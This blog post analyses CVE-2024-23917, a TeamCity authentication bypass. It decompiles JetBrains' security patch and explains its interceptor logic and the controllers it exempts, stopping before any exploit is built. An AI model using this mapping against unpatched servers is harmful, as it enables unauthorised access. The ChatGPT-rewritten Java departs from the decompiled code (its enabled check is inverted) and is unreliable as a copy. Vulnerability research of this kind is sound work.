---
author: AnirudhAnand
layout: post
title: Diving deep into Jetbrains TeamCity Part 1 - Analysing CVE-2024-23917 leading to Authentication Bypass
categories:
- java
summary: This article aims to explore the details of CVE-2024-23917 and explain the process of constructing an exploit leading to Authentication Bypass. This article is only intended for educational purposes for  understanding how vulnerabilities occur in real world.
description: This article aims to explore the details of CVE-2024-23917 and explain the process of constructing an exploit leading to Authentication Bypass. This article is only intended for educational purposes for  understanding how vulnerabilities occur in real world.
---

## Introduction
JetBrains TeamCity is a continuous integration (CI) and continuous delivery (CD) tool developed by JetBrains. It is designed to automate the building, testing, and deployment processes in software development. 

**<u>NOTE</u>**: This article is only intended for educational purposes understanding how vulnerabilities occur in real world.

## Installing TeamCity

Download the [2023.11.2](https://download.jetbrains.com/teamcity/TeamCity-2023.11.2.tar.gz){:target="_blank"} release from the official [Jetbrains TeamCity](https://www.jetbrains.com/teamcity/download/other.html){:target="_blank"} website and extract it. For the purpose of this article, I will be using the Intellij IDEA Community Edition to navigate through the codebase.

## Decompiling the Jars

Exploring through the teamcity directories, we can see a lot of compiled Jars. In order to access the code, we can decompile these jars using one of the common decompilers. Since we are using Intellij IDEA, we can use the inbuilt decompiler to decompile the jars. 

One of the problems here is that there are way too many jar files which needs to be decompiled. In order make the process easy, we have written a quick bash script which uses the default IntelliJ decompiler to extract all jar files into a central folder called `fern`. 

{% highlight bash lineos %}
#!/bin/bash
#
# Extract source code from jar files
# Can leverage fern from intelij or jadx
# Usage:
# ./sourcerer.sh <DIR1> <DIR2> <DIR3> ...

DECOMPILER="fern"
PROCESSES=10 # 0 for unlimited

FERN_JAR="/Applications/IntelliJ IDEA CE.app/Contents/plugins/java-decompiler/lib/java-decompiler.jar"

for dir in "$@"; do
    workdir="$dir/$DECOMPILER"
    mkdir -p "$workdir"
    echo "Processing $dir"
    case $DECOMPILER in
        "fern")
            mkdir "$workdir/fern-jars"
            find "$dir" -type f -print0 -name "*.jar" | xargs -0 -I {} -P "$PROCESSES" java -jar "$FERN_JAR" {} "$workdir/fern-jars"
            find "$workdir/fern-jars" -name "*.jar" -exec unzip -o {} -d "$workdir" \;
            rm -rf "$workdir/fern-jars"
            ;;
        "jadx")
            find "$dir" -type f -print0 -name "*.jar" | xargs -0 -I {} -P "$PROCESSES" jadx -d "$workdir" {} --comments-level none
            ;;
    esac
done
{%endhighlight%}

Save the file as `sourcerer.sh` and run the script providing the extracted teamcity directory as the input. The script will repeatedly start extracting all jars inside.

**<u>NOTE</u>**: The script will take sometime complete since there are way too many jars. You can modify the `PROCESSES` variable to make the script faster.

{% highlight bash lineos %}
a0xnirudh@X1 ~/teamcity $ chmod +x sourcerer.sh
a0xnirudh@X1 ~/teamcity $ ./sourcerer.sh TeamCity
{%endhighlight%}

Once the extraction is complete, a new directory named `fern` will be available inside the TeamCity project folder. From intellij, **right click on this folder > Mark Directory as > Sources Root**. This step is important without which we won't be able to do dynamic analysis or search for classes etc...

## Architecture

Exploring through the directory structure, especially within the `webapps/ROOT` directory, we can see the `web.xml` file inside the `WEB-INF` directory. This file contains the Servlets, mappings and filters.

### Servlet Filters

In general, Servlet mappings are used to define API endpoints to corresponding controllers. Let's understand how the file and its mapping works:

**File**: *teamcity/TeamCity/webapps/ROOT/WEB-INF/web.xml*
{% highlight xml lineos %}
17:   <servlet>
18:     <description>Support maintenance screens when TeamCity server is starting up.</description>
19:     <servlet-name>MaintenanceServlet</servlet-name>
20:     <servlet-class>jetbrains.buildServer.maintenance.StartupServlet</servlet-class>
21:   </servlet>
{%endhighlight%}

The file starts creating servlets with a name, in the above example `MaintenanceServlet` which is defined in the class `jetbrains.buildServer.maintenance.StartupServlet`. Let's look into it's servlet-mapping:

{% highlight xml lineos %}
126:   <servlet-mapping>
127:     <servlet-name>MaintenanceServlet</servlet-name>
128:     <url-pattern>/mnt/*</url-pattern>
129:   </servlet-mapping>
{%endhighlight%}

Servlet mapping specifies the servlet name and the URL pattern. This means, if a request comes to the defined URL pattern, in this case, `/mnt/*`, then the `MaintenanceServlet` servlet will be invoked which further leading to the invocation of the controller `jetbrains.buildServer.maintenance.StartupServlet` class. 

Similarly we have filters defined in the `web.xml`, which can be considered as middlewares that get to run before the requests gets into servlet class or the controllers. Let's take an example to understand:

**File**: *teamcity/TeamCity/webapps/ROOT/WEB-INF/web.xml*
{% highlight xml lineos %}
70:   <filter>
71:     <filter-name>disableBrowserCacheFilter</filter-name>
72:     <filter-class>jetbrains.buildServer.web.DisableBrowserCacheFilter</filter-class>
73:     <async-supported>true</async-supported>
74:   </filter>
{%endhighlight%}

A filter named `disableBrowserCacheFilter` is defined which is handled by the class `jetbrains.buildServer.web.DisableBrowserCacheFilter`. Now let's look at its filter-mapping:

{% highlight xml lineos %}
308:   <filter-mapping>
309:     <filter-name>disableBrowserCacheFilter</filter-name>
310:     <url-pattern>/update/*</url-pattern>
311:   </filter-mapping>
{%endhighlight%}

Filter mappings specify which filters to be run for a given url pattern. Here, for any URL matching `/update/*`, the `disableBrowserCacheFilter` filter will be run which is defined in the class `jetbrains.buildServer.web.DisableSessionIdFromUrlFilter`.

Now if we look at the servlet mapping for `/update/*`, it points to `buildServer` servlet. 

{% highlight xml lineos %}
156:   <servlet-mapping>
157:     <servlet-name>buildServer</servlet-name>
158:     <url-pattern>/update/*</url-pattern>
159:   </servlet-mapping>
{%endhighlight%}

So in-short, if any request comes to `/update/*` endpoint, the filter will be triggered first and then the request is forwarded to Servlet (or controller class). 

Similarly another thing we can see is error mapping:
{% highlight xml lineos %}
48:   <error-page>
49:     <error-code>401</error-code>
50:     <location>/unauthorized.html</location>
51:   </error-page>
{%endhighlight%}

So for a given request, if the controller returns the response code 401, then the `/unauthorized.html` is rendered.


### Spring Interceptors

Now filters is a functionality provided by native Java Servlets but what if, we want to achieve the same functionality but need more context before taking a decision? For example, we wanna setup a filter which checks for authentication but since the authentication part is handled by SprintBoot, the servlet filters won't have context since it operates on a lower level as the following diagram depicts:


<div align='center'><img src="/images/2024/teamcity/filters_interceptors.png" alt="Filters and Interceptors in springboot" height="450"/></div>

In order to achieve a similar functionality, Springboot has a concept of Interceptors which is a part of core Spring MVC framework which allows us to intercept and process HTTP requests and responses before they are handled by the controller or sent back to the client. It's typically used for request transformations, logging (debug or performance logs) or security (AuthN or AuthZ).

Filters are similar to interceptors in functionality (can be used to interept requests and response) but it operates at the Servlet API level (and not specific to Spring framework since spring framework itself is built on top of Servlet API). This means that filters are executed before the request even reaches the Springboot. So, in general, we can use a combination of both (like what TeamCity does) but interceptors are commonly used when we need access to Spring application context. Example, while logging, caching can be done at Filter level, AuthN/AuthZ is generally done at Interceptor level (since it needs Spring context)

So how does all these work together ? The following diagram represents the flow ([image source](https://blog.kakaocdn.net/dn/bmoLez/btrv5mrG2OD/c5k6qMlA94FMvVnM2qMLY1/img.png)):

 <div align='center'><img src="/images/2024/teamcity/springboot_handler_interceptor.png" alt="Tomcat Springboot Interceptor architecture" height="450"/></div>

1. An incoming HTTP request is first recieved by the webserver (in this case tomcat) which then passes the request onto to Java Servlets.

2. Based on the route mapping, the servlet filters are run and then the request is forwarded to Springboot. The `Dispatcher Servlet` is the default entry point for all the incoming requests into springboot.

3. Once the `Dispatcher Servlet` recieves the requests, it consults with the URL `HandlerMapping` which determines which controller does the request should be passed onto. 

4. But before being processed by the controllers, the requests are passed through Spring Interceptors. A given request can be processed by a different number of Interceptors before it reaches to controllers. 

Interceptors are classes that implement the `handlerInterceptor` interface which has 3 methods:

`preHandle()`: Returns a boolean value indicating whether the request should continue to the next interceptor/controller or not (ex: if AuthZ fails, return false and request won't reach controller)

`postHandle()`: Executed after the controller method is called but before sending the response to the client (modifying response header?).

`afterCompletion()`: Executed after the response is sent to the client (any cleanup tasks).


There could be more than 1 interceptor which will be triggered for a given API endpoint, in which case, the flow works as per the diagram below ([image source](https://media.licdn.com/dms/image/C4E12AQF1EMvT8wpJTg/article-inline_image-shrink_1500_2232/0/1614448550926?e=1718841600&v=beta&t=SHFv3pd9uPcwdb5yG6BoQWKmKvMCa6i0r6E6v8SMP2I)):
 <div align='center'><img src="/images/2024/teamcity/spring_interceptors.png" alt="Springboot Interceptor architecture" height="450"/></div>

Now that the fundamentals for exploring the vulnerabilities are clear, let's explore the security patch which got released.

## Understanding the Patch (CVE-2024-23917)

From the [official advisory](https://blog.jetbrains.com/teamcity/2024/02/critical-security-issue-affecting-teamcity-on-premises-cve-2024-23917/), one of the ways to fix the vulnerability is to apply a [security patch](https://download.jetbrains.com/teamcity/plugins/internal/fix_CVE_2024_23917.zip). Let's download the patch and try to understand it better.  

{% highlight bash lineos %}
a0xnirudh@X1 ~/teamcity/cve-2024-23917 $ wget -c https://download.jetbrains.com/teamcity/plugins/internal/fix_CVE_2024_23917.zip

a0xnirudh@X1 ~/teamcity/cve-2024-23917 $ unzip fix_CVE_2024_23917.zip
Archive:  fix_CVE_2024_23917.zip
   creating: server/
  inflating: server/patch-common-1.0-SNAPSHOT.jar
  inflating: server/security-patch-plugin-1.0-SNAPSHOT.jar
  inflating: teamcity-plugin.xml
{%endhighlight%}

Decompiling and trying to read the source code of the jar, we can see that the patch is heavily obfuscated. Let's try to [deobfuscate](https://github.com/java-deobfuscator/deobfuscator) the patch and then decompile ([using cfr](https://github.com/leibnitz27/cfr)) it again to see if the code is more readable:

{% highlight bash lineos %}
a0xnirudh@X1 ~/teamcity/cve-2024-23917/server $ cat config1.yml
input: patch-common-1.0-SNAPSHOT.jar
detect: true


a0xnirudh@X1 ~/teamcity/cve-2024-23917/server $ java -jar deobfuscator.jar --config config1.yml
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Loading classpath
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Loading input
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Detecting known obfuscators
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator -
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - RuleSuspiciousClinit: Zelix Klassmaster typically embeds decryption code in <clinit>. This sample may have been obfuscated with Zelix Klassmaster
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - 	Found suspicious <clinit> in 0/0/0/0
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Recommend transformers:
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - (Choose one transformer. If there are multiple, it's recommended to try the transformer listed first)
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - 	None
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator -
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - RuleSimpleStringEncryption: Zelix Klassmaster has several modes of string encryption. This mode replaces string literals with a static string or string array, which are decrypted in <clinit> Note that this mode does not generate a method with signature (II)Ljava/lang/String;
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - 	Found suspicious <clinit> in 0/0/0/0
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Recommend transformers:
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - (Choose one transformer. If there are multiple, it's recommended to try the transformer listed first)
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - 	com.javadeobfuscator.deobfuscator.transformers.zelix.StringEncryptionTransformer
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - 	com.javadeobfuscator.deobfuscator.transformers.zelix.string.SimpleStringEncryptionTransformer
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - All detectors have been run. If you do not see anything listed, check if your file only contains name obfuscation.
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Do note that some obfuscators do not have detectors.
{%endhighlight%}

Using the deobfuscator detection technique, it recommends us to use `com.javadeobfuscator.deobfuscator.transformers.zelix.StringEncryptionTransformer`. Let's deobfuscate the jars and try to decompile it using [cfr](https://github.com/leibnitz27/cfr) decompiler.

{% highlight bash lineos %}
a0xnirudh@X1 ~/teamcity/cve-2024-23917/server $ cat config1.yml
input: patch-common-1.0-SNAPSHOT.jar
output: patch_common_deobfuscated.jar
transformers:
  - com.javadeobfuscator.deobfuscator.transformers.zelix.StringEncryptionTransformer


a0xnirudh@X1 ~/teamcity/cve-2024-23917/server $ cat config2.yml
input: security-patch-plugin-1.0-SNAPSHOT.jar
output: security_patch_deobfuscated.jar
transformers:
  - com.javadeobfuscator.deobfuscator.transformers.zelix.StringEncryptionTransformer


a0xnirudh@X1 ~/teamcity/cve-2024-23917/server $ java -jar deobfuscator.jar --config config1.yml
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Loading classpath
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Loading input
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Computing callers
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Transforming
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Running com.javadeobfuscator.deobfuscator.transformers.zelix.StringEncryptionTransformer
[Zelix] [StringEncryptionTransformer] Starting
[Zelix] [StringEncryptionTransformer] Decrypted strings from 2 encrypted classes
[Zelix] [StringEncryptionTransformer] Decrypted 51 strings
[Zelix] [StringEncryptionTransformer] Done
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Writing


a0xnirudh@X1 ~/teamcity/cve-2024-23917/server $ java -jar deobfuscator.jar --config config2.yml
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Loading classpath
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Loading input
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Computing callers
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Transforming
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Running com.javadeobfuscator.deobfuscator.transformers.zelix.StringEncryptionTransformer
[Zelix] [StringEncryptionTransformer] Starting
[Zelix] [StringEncryptionTransformer] Decrypted strings from 1 encrypted classes
[Zelix] [StringEncryptionTransformer] Decrypted 3 strings
[Zelix] [StringEncryptionTransformer] Done
[main] INFO com.javadeobfuscator.deobfuscator.Deobfuscator - Writing


a0xnirudh@X1 ~/teamcity/cve-2024-23917/server $ java -jar cfr-0.152.jar patch_common_deobfuscated.jar --renameillegalidents true --outputdir patch_common_extract
Processing patch_common_deobfuscated.jar (use silent to silence)
Processing 0.0.0.0
Processing 0.0.0.2


a0xnirudh@X1 ~/teamcity/cve-2024-23917/server $ java -jar cfr-0.152.jar security_patch_deobfuscated.jar --renameillegalidents true --outputdir security_patch_extract
Processing security_patch_deobfuscated.jar (use silent to silence)
Processing 0.0.0.1


a0xnirudh@X1 ~/teamcity/cve-2024-23917/server $ tree patch_common_extract
patch_common_extract
├── 0
│   └── 0
│       └── 0
│           ├── 0.java
│           └── 2.java
└── summary.txt

4 directories, 3 files


a0xnirudh@X1 ~/teamcity/cve-2024-23917/server $ tree security_patch_extract
security_patch_extract
├── 0
│   └── 0
│       └── 0
│           └── 1.java
└── summary.txt

4 directories, 2 files
{%endhighlight%}

So we finally have 3 files. Let's look at the `1.java` which we extracted from the original `security-patch-plugin-1.0-SNAPSHOT.jar` file:

{% highlight java lineos %}
/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  0.0.0.0
 *  jetbrains.buildServer.ServiceLocator
 *  jetbrains.buildServer.log.Loggers
 *  jetbrains.buildServer.serverSide.BuildServerListener
 *  jetbrains.buildServer.serverSide.TeamCityProperties
 *  jetbrains.buildServer.util.EventDispatcher
 *  jetbrains.buildServer.version.ServerVersionHolder
 *  jetbrains.buildServer.web.openapi.PluginDescriptor
 *  org.jetbrains.annotations.NotNull
 */
package 0.0.0;

import 0.0.0._0;
import jetbrains.buildServer.ServiceLocator;
import jetbrains.buildServer.log.Loggers;
import jetbrains.buildServer.serverSide.BuildServerListener;
import jetbrains.buildServer.serverSide.TeamCityProperties;
import jetbrains.buildServer.util.EventDispatcher;
import jetbrains.buildServer.version.ServerVersionHolder;
import jetbrains.buildServer.web.openapi.PluginDescriptor;
import org.jetbrains.annotations.NotNull;

public class _1 {
    public static int cfr_renamed_0;
    public static boolean cfr_renamed_1;

    public _1(@NotNull ServiceLocator serviceLocator, @NotNull PluginDescriptor pluginDescriptor, @NotNull EventDispatcher<BuildServerListener> eventDispatcher) {
        boolean bl = cfr_renamed_1;
        int n = Integer.parseInt(ServerVersionHolder.getVersion().getBuildNumber());
        int n2 = TeamCityProperties.getInteger((String)"teamcity.CVE-2024-23917.patch.maxAffectedBuildNumber", (int)147486);
        if (!bl) {
            if (n > n2) {
                Loggers.SERVER.warn("The plugin " + pluginDescriptor.getPluginName() + " is no longer required for this TeamCity version");
                return;
            }
            new _0(eventDispatcher, serviceLocator).cfr_renamed_0(true);
        }
        if (bl) {
            int n3 = cfr_renamed_0;
            cfr_renamed_0 = ++n3;
        }
    }
}

{%endhighlight%}

This is a much more readable code but still could be cleaned up a bit. After using ChatGPT (+some manual changes) to rewrite the code to make it even more readable, the code looks like the following:

{% highlight java lineos %}
package 0.0.0;

import jetbrains.buildServer.ServiceLocator;
import jetbrains.buildServer.log.Loggers;
import jetbrains.buildServer.serverSide.BuildServerListener;
import jetbrains.buildServer.util.EventDispatcher;
import jetbrains.buildServer.version.ServerVersionHolder;
import jetbrains.buildServer.web.openapi.PluginDescriptor;
import org.jetbrains.annotations.NotNull;

public class SecurityPluginInitializer {
    private static int counter = 0;
    private static boolean isEnabled = false;

    public SecurityPluginInitializer(@NotNull ServiceLocator serviceLocator, @NotNull PluginDescriptor pluginDescriptor, @NotNull EventDispatcher<BuildServerListener> eventDispatcher) {
        if (isEnabled) {
            int buildNumber = Integer.parseInt(ServerVersionHolder.getVersion().getBuildNumber());
            int maxAffectedBuildNumber = TeamCityProperties.getInteger("teamcity.CVE-2024-23917.patch.maxAffectedBuildNumber", 147486);
            if (buildNumber > maxAffectedBuildNumber) {
                Loggers.SERVER.warn("The plugin " + pluginDescriptor.getPluginName() + " is no longer required for this TeamCity version");
                return;
            }
            new SecurityInterceptor(eventDispatcher, serviceLocator).initializeSecurity(true);
        } else {
            counter++;
        }
    }
}
{%endhighlight%} 

The code reads the `currentBuildNumber` and if the current build number is less than the maximum affected build number (`147486`), then the installation is proceeded ahead, else skipped. For proceeding ahead, it triggers the code `new SecurityInterceptor(eventDispatcher, serviceLocator).initializeSecurity(true);` which is coming from our extracted `0.java` file.

Now, let's look at the `2.java` file first:


{% highlight java lineos %}
package com.example.buildserver;

import java.util.List;
import com.example.security.SecurityHandler;
import jetbrains.buildServer.log.Loggers;
import jetbrains.buildServer.serverSide.BuildServerAdapter;

class SecurityPatch extends BuildServerAdapter {

    private final boolean isSecurityPatchEnabled;
    private final SecurityHandler securityHandler;
    public static boolean isDebugModeEnabled;

    SecurityPatch(SecurityHandler handler, boolean isEnabled) {
        this.securityHandler = handler;
        this.isSecurityPatchEnabled = isEnabled;
    }

    @Override
    public void serverStartup() {
        boolean isDebug = isDebugModeEnabled;

        try {
            Class<?> urlMappingClass = Class.forName("jetbrains.spring.web.UrlMapping");
            Object urlMappingService = securityHandler.findSingletonService(urlMappingClass);

            Class<?> authInterceptorClass = Class.forName("jetbrains.buildServer.controllers.interceptors.AuthorizationInterceptorImpl");
            Object authInterceptorService = securityHandler.findSingletonService(authInterceptorClass);

            Class<?> superClass = urlMappingClass.getSuperclass();
            Field adaptedInterceptorsField = findField(superClass, "adaptedInterceptors");

            if (adaptedInterceptorsField == null) {
                throw new IllegalStateException("Required field 'adaptedInterceptors' not found in " + urlMappingClass.getName());
            }

            adaptedInterceptorsField.setAccessible(true);
            List<Object> adaptedInterceptors = (List<Object>) adaptedInterceptorsField.get(urlMappingService);
            adaptedInterceptors.add(securityHandler.createProxy(authInterceptorService));

            if (isSecurityPatchEnabled) {
                Loggers.SERVER.warn("Security patch for CVE-2024-23917 has been activated");
            } else {
                Loggers.SERVER.debug("Security patch for CVE-2024-23917 has been activated");
            }
        } catch (Throwable ex) {
            Loggers.SERVER.warn("Could not activate security patch for CVE-2024-23917. Error: " + ex.toString());
            Loggers.SERVER.debug("Error activating security patch for CVE-2024-23917: " + ex.toString(), ex);
        }
    }

    private Field findField(Class<?> clazz, String fieldName) {
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        return null;
    }
}
{%endhighlight%} 

1. The code starts with accessing `UrlMapping` class from within `jetbrains.spring.web.UrlMapping` and then further trying to access it's superClass. Searching through the codebase, we can see the superClass for `UrlMapping` is `TeamCitySimpleUrlHandlerMapping`.

2. The superClass for `TeamCitySimpleUrlHandlerMapping` is `AbstractHandlerMapping`. The code then further tries to fetch the `adaptedInterceptors` field from the superClass which in our case is the `TeamCitySimpleUrlHandlerMapping`.

3. Looking through the codebase, we won't see a field named `adaptedInterceptors` defined within `TeamCitySimpleUrlHandlerMapping` but somehow the patch is trying to fetch it. Going through the `findField` function, we can see that `findField` attempts to find a field on the supplied class and if not found, it searches through it's superclasses as well. So essentially we are fetching `adaptedInterceptors` from `UrlMapping` -> `TeamCitySimpleUrlHandlerMapping` -> `AbstractHandlerMapping` !

4. In Spring MVC, the collection of `adaptedInterceptors` is generally accessed or modified through reflection, as shown in the above code snippet. This approach allows for dynamic changes to the request processing pipeline without modifying core configurations or restarting the server. This can be useful for applying security patches, introducing custom interceptors, or integrating third-party interceptors at runtime.

5. Finally they are adding a `new Interceptor` into the list of `adaptedInterceptors`, this means that most like this newly added Interceptor will ensure the authentication bypass vulnerability is prevented.

Now let's finally look at the final file where all the logic for custom new interceptor is written:

{% highlight java lineos %}
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.EventListener;
import java.util.HashSet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import jetbrains.buildServer.log.Loggers;
import jetbrains.buildServer.serverSide.TeamCityProperties;
import jetbrains.buildServer.util.EventDispatcher;
import jetbrains.buildServer.web.util.WebUtil;
import org.jetbrains.annotations.NotNull;

public class SecurityInterceptor {
    private final EventDispatcher<BuildServerListener> eventDispatcher;
    private final ServiceLocator serviceLocator;
    private static boolean securityPatchActivated;

    public SecurityInterceptor(@NotNull EventDispatcher<BuildServerListener> eventDispatcher, @NotNull ServiceLocator serviceLocator) {
        boolean previousActivation = securityPatchActivated;
        this.eventDispatcher = eventDispatcher;
        this.serviceLocator = serviceLocator;
        if (securityPatchActivated) {
            securityPatchActivated = !previousActivation;
        }
    }

    public void activateSecurityPatch(boolean activated) {
        this.eventDispatcher.addListener((EventListener)((Object)new SecurityPatchActivator(this, activated)));
    }

    private Object createHandlerInterceptorProxy(Object handler) throws ClassNotFoundException {
        Class<?> clazz = Class.forName("org.springframework.web.servlet.HandlerInterceptor"); // handler here is AuthorizationInterceptorImpl
        return Proxy.newProxyInstance(this.getClass().getClassLoader(), new Class[]{clazz}, (Object proxyObj, Method method, Object[] methodArgs) -> this.intercept_wrap(handler,proxyObj, method,  methodArgs));
    }

    private boolean intercept(HttpServletRequest request, HttpServletResponse response, Object handler, Object handlerInterceptor) {
        
        // this is called from AuthorizationInterceptorImpl.prehandle func is called
        // handlerInterceptor is AuthorizationInterceptorImpl
        // handler is controller being called

        /**
         * if (!interceptor.preHandle(request, response, this.handler)) {
                this.triggerAfterCompletion(request, response, (Exception)null);
                return false;
            }

            this is where its called
            interceptor.prehandle will call this 
                - intercept fnc where 
         */
        
        boolean isSecurityPatchEnabled = TeamCityProperties.getBooleanOrTrue("teamcity.CVE-2024-23917.patch.enabled");
        if (isSecurityPatchEnabled == false) {
            return true;
        }
        
        Object includeRequestUri = request.getAttribute("javax.servlet.include.request_uri");
        if (includeRequestUri != null || request.getAttribute("javax.servlet.forward.request_uri") != null) {
            return true;
        }
        
        String path = WebUtil.getPathWithoutContext(request); // removes ;<--anything after-->
        boolean isAgentEndpoint = path.startsWith("/app/agents/") || path.startsWith("/update/");
        if (isAgentEndpoint) {
            return true;  // donot run this patch
        }
        
        HashSet<String> securedEndpoints = new HashSet<>();
        securedEndpoints.add("jetbrains.buildServer.controllers.login.LoginController");
        securedEndpoints.add("jetbrains.buildServer.controllers.login.LoginSubmitController");
        securedEndpoints.add("jetbrains.buildServer.controllers.login.LoginIconsController");
        securedEndpoints.add("jetbrains.buildServer.controllers.user.RegisterUserController");
        securedEndpoints.add("jetbrains.buildServer.controllers.user.SubmitRegisterUserController");
        securedEndpoints.add("jetbrains.buildServer.controllers.admin.users.SetupAdminController");
        securedEndpoints.add("jetbrains.buildServer.controllers.admin.users.SubmitSetupAdminController");
        securedEndpoints.add("jetbrains.buildServer.controllers.admin.users.SubmitCreateAdminController");
        securedEndpoints.add("jetbrains.buildServer.controllers.status.ExternalStatusController");
        securedEndpoints.add("jetbrains.buildServer.controllers.license.ShowAgreementController");
        securedEndpoints.add("jetbrains.buildServer.web.RuntimeErrorController");
        securedEndpoints.add("jetbrains.buildServer.web.RuntimeErrorTestController");
        securedEndpoints.add("jetbrains.buildServer.controllers.agentServer.AgentPollingProtocolController");
        securedEndpoints.add("jetbrains.buildServer.controllers.agentServer.AgentProtocolsController");
        securedEndpoints.add("jetbrains.buildServer.controllers.XmlRpcController");
        securedEndpoints.add("jetbrains.buildServer.web.plugins.agent.BuildAgentUpdateInfoControllerNew");
        securedEndpoints.add("jetbrains.buildServer.serverSide.oauth.space.SpaceEndpointController");
        securedEndpoints.add("jetbrains.buildServer.resetPassword.ForgotPasswordController");
        securedEndpoints.add("jetbrains.buildServer.resetPassword.ResetPasswordController");
        securedEndpoints.add("jetbrains.buildServer.controllers.BadRequestController");
        securedEndpoints.add("jetbrains.buildServer.controllers.PageNotFoundController");
        securedEndpoints.add("jetbrains.buildServer.controllers.agent.AgentParametersController");
        securedEndpoints.add("jetbrains.buildServer.controllers.agent.UploadOnServerController");
        securedEndpoints.add("jetbrains.buildServer.controllers.proxyHealthCheck.PreferredNodeHealthStatusController");
        securedEndpoints.add("jetbrains.buildServer.win32.web.LoginCheckController");
        securedEndpoints.add("jetbrains.buildServer.win32.web.LoginController");
        securedEndpoints.add("jetbrains.buildServer.controllers.PageResourceCompressorImpl");
        securedEndpoints.add("jetbrains.spring.web.JspController");
        
        //issue
            // here they are checking, instead of (.jsp + jsp_precompile) to know which request to skip, we have list of all controllers to skip
            //  , check if these request belong to these class's, if yes, we can let them go, else in anyother case, check auth
        
        
        if (securedEndpoints.contains(handler.getClass().getName())) {
            return true; // donot run the patch
        }
        
        Boolean isAuthenticationRequired = checkAuthenticationRequirement(handlerInterceptor, path); // calls the real fn to check auth is needed fnc's 
        if (Boolean.FALSE.equals(isAuthenticationRequired)) {
            response.setStatus(403);
            try {
                response.getWriter().write("Access denied");
                Loggers.SERVER.warn("Replying with 403 status for the unauthorized request: " + WebUtil.getRequestDump(request));
                return false;
            } catch (IOException e) {
                // Log the exception if necessary
            }
        }
        
        return false;
    }

    private static boolean checkAuthenticationRequirement(Object handler, String path) {

        /**
         * in short this is whats happening
         * AuthorizationInterceptorImpl.myAuthorizationPaths.isAuthenticationRequired(path)
         * 
         */

        Object authorizationPaths;
        try {
            Field authorizationPathsField = handler.getClass().getDeclaredField("myAuthorizationPaths");
            authorizationPathsField.setAccessible(true);
            authorizationPaths = authorizationPathsField.get(handler);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            try {
                Method isAuthenticationRequiredMethod = handler.getClass().getDeclaredMethod("isAuthenticationRequired", String.class);
                isAuthenticationRequiredMethod.setAccessible(true);
                return (Boolean) isAuthenticationRequiredMethod.invoke(handler, path); // 
            } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException ex) {
                return true;
            }
        }
        try {
            Method isAuthenticationRequiredMethod = authorizationPaths.getClass().getDeclaredMethod("isAuthenticationRequired", String.class);
            return (Boolean) isAuthenticationRequiredMethod.invoke(authorizationPaths, path);
        } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {
            return true;
        }
    }

    private boolean isAuthenticationPresent() {
        try {
            Method getContextMethod = SecurityContextHolder.class.getMethod("getContext");
            Object securityContext = getContextMethod.invoke(null);
            Method getAuthenticationMethod = securityContext.getClass().getMethod("getAuthentication");
            return getAuthenticationMethod.invoke(securityContext) != null;
        } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {
            return true;
        }
    }

    private static Class<?> getSecurityContextHolderClass() throws ClassNotFoundException {
        return Class.forName("org.springframework.security.core.context.SecurityContextHolder");
    }

    private Object intercept_wrap(Object handler, Object handlerInterceptor, Method method, Object[] args) throws Throwable {
        boolean isPreHandleMethod = method.getName().equals("preHandle");
        if (isPreHandleMethod) {
            return interceptPreHandle((HttpServletRequest) args[0], (HttpServletResponse) args[1], args[2], handler);
        }
        return null;
    }

    private boolean interceptPreHandle(HttpServletRequest request, HttpServletResponse response, Object handler, Object handlerInterceptor) {
        return intercept(request, response, handler, handlerInterceptor);
    }

    static ServiceLocator getServiceLocator(SecurityInterceptor interceptor) {
        return interceptor.serviceLocator;
    }

    static Object createHandlerInterceptorProxy(SecurityInterceptor interceptor, Object handler) throws ClassNotFoundException {
        return interceptor.createHandlerInterceptorProxy(handler);
    }
}
{%endhighlight%}

1. We start by creating a class named SecurityInterceptor (custom name we gave during cleanup) inside which a lot of methods are defined. One of the most interesting methods is `intercept`, which from the looks of it, handles all the main logic for fixing the vulnerability.

2. The function starts by checking if the property `teamcity.CVE-2024-23917.patch.enabled` is set to `true`. If it's false, the function returns immediately.

3. In a servlet environment, requests can be "included" or "forwarded" which typically occurs when one servlet forwards or includes the request/response to/from another servlet as part of the request handling process. 

